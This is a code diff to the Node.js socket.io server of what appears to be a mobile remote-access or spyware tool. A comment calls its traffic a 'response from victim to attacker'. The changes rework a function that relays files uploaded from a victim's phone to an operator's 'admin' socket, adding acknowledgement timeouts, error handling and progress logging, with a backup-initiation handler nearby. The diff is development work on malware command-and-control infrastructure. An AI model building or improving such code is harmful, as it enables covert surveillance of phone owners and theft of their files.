@@ -96,34 +96,85 @@ const response =(action, data)=>{// response from victim to attacker
 //     }
 //   }
 
+const formatSize = (bytes = 0) => {
+    if (!bytes) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + ' ' + sizes[i];
+};
+
 const responseBinary = (action, data, callback) => { // response from mobile
-    if (adminSocketId) {
-        // Calculate data size
-        let dataSize = 0;
-        if (data) {
-            if (typeof data === 'string') {
-                dataSize = Buffer.byteLength(data, 'utf8');
-            } else if (Buffer.isBuffer(data)) {
-                dataSize = data.length;
-            } else if (typeof data === 'object') {
+    const adminSocket = adminSocketId ? io.sockets.sockets.get(adminSocketId) : null;
+
+    // Calculate data size for logging
+    let dataSize = 0;
+    if (data) {
+        if (typeof data === 'string') {
+            dataSize = Buffer.byteLength(data, 'utf8');
+        } else if (Buffer.isBuffer(data)) {
+            dataSize = data.length;
+        } else if (typeof data === 'object') {
+            try {
                 dataSize = Buffer.byteLength(JSON.stringify(data), 'utf8');
+            } catch (err) {
+                dataSize = 0;
+                log(`responseBinary: Failed to calculate payload size -> ${err.message}`);
             }
         }
-        
-        // Format size for readability
-        const formatSize = (bytes) => {
-            if (bytes === 0) return '0 Bytes';
-            const k = 1024;
-            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
-        };
-        
-        log(`response action: ${action} | size: ${formatSize(dataSize)}`);
-        callback("success");
-        io.to(adminSocketId).emit(action, data);
     }
-}
+
+    log(`response action: ${action} | size: ${formatSize(dataSize)}`);
+
+    if (!adminSocket) {
+        log(`responseBinary: No admin connected to receive "${action}" payload. Acknowledging sender to avoid blocking.`);
+        callback("success");
+        return;
+    }
+
+    const summary = {
+        fileName: data && data.fileName ? data.fileName : undefined,
+        uploaded: typeof data?.fileUploadedSize === 'number' ? data.fileUploadedSize : undefined,
+        total: typeof data?.fileSize === 'number' ? data.fileSize : undefined,
+        chunkSize: typeof data?.chunkSize === 'number' ? data.chunkSize : undefined,
+        encoding: data && data.encoding ? data.encoding : undefined,
+    };
+
+    adminSocket
+        .timeout(15000)
+        .emit(action, data, (err, responses) => {
+            if (err) {
+                log(`responseBinary: Ack timeout for "${action}" -> ${err.message || err}`);
+                callback("success");
+                return;
+            }
+
+            const response = Array.isArray(responses) ? responses[0] : responses;
+            if (response && typeof response === 'object') {
+                if (response.status === 'error') {
+                    log(`responseBinary: Admin reported error for "${action}": ${response.message || 'unknown error'}`);
+                    callback(`error: ${response.message || 'admin error'}`);
+                    return;
+                }
+                const statusLog = [
+                    `Admin ack for "${action}" received`,
+                    summary.fileName ? `file=${summary.fileName}` : null,
+                    summary.uploaded != null && summary.total != null
+                        ? `progress=${summary.uploaded}/${summary.total}`
+                        : null,
+                    summary.chunkSize != null ? `chunk=${summary.chunkSize}` : null,
+                    summary.encoding ? `encoding=${summary.encoding}` : null,
+                ]
+                    .filter(Boolean)
+                    .join(' | ');
+                if (statusLog.length > 0) {
+                    log(`responseBinary: ${statusLog}`);
+                }
+            }
+
+            callback("success");
+        });
+};
 
 // Handle backup initiation and send response to admin
 const handleBackupInitiation = (socket, action, moduleName) => {
